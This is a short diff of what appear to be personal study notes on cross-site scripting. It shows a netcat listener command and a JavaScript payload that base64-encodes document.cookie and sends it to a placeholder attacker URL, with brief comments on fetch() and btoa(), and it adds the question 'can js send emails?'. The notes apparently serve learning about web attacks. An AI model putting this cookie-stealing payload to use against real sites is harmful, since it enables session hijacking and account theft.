@@ -27,4 +27,5 @@ nc -l -p 9001
     fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );
         fetch(): make http request  
         btoa(): encode with base64 (for transport)
-    
+
+can js send emails?
